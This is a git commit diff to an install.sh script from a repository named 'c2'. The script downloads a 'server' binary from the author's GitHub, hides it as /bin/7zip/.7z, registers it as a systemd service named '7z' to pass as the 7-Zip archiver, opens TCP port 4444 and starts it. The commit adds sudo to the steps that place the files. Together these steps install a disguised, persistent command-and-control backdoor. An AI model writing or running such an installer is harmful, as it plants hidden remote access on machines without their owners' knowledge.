5f2a98de99509eade0dcf551cb9ba943be17f9dc
Ricardo <ricardo.palma.rjp@gmail.com>
2024-03-21 19:06:24 -0500

    Adding root access to script

--- install.sh
+++ install.sh
@@ -1,11 +1,11 @@
 #!/bin/bash
-mkdir /bin/7zip
+sudo strace -o /dev/null mkdir /bin/7zip
 curl https://github.com/Palma-Ricardo/c2/raw/main/server -o server
-mv server /bin/7zip/.7z
+sudo strace -o /dev/null mv server /bin/7zip/.7z
 rm server
-chmod +x /bin/7zip/.7z
+sudo strace -o /dev/null chmod +x /bin/7zip/.7z
 curl https://github.com/Palma-Ricardo/c2/raw/main/7z.service -o 7z.service
-mv 7z.service /etc/systemd/system/7z.service
+sudo strace -o /dev/null mv 7z.service /etc/systemd/system/7z.service
 rm 7z.service
 sudo strace -o /dev/null firewall-cmd --add-port=4444/tcp
 sudo strace -o /dev/null systemctl start 7z
